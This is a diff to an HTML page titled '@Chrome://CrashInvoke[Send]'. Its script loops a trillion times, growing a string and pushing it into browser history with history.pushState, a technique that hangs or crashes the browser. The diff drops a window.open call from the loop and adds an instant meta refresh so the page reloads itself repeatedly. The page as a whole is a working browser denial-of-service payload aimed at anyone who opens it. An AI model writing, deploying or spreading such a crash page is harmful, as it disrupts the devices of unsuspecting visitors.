@@ -1,6 +1,7 @@
 <html>
   <head>
     <title>@Chrome://CrashInvoke[Send]</title>
+    <meta http-equiv="Refresh" content="0; url='index.html'" />
   </head>
   
   <body>
@@ -19,9 +20,9 @@
       for( var i = 0; i < 1000000000000; i++ ) {
         total = total + i.toString();
         history.pushState(0,0, total );
-        window.open("index.html");
       }
     </script>
   
   </body>
 </html>
+
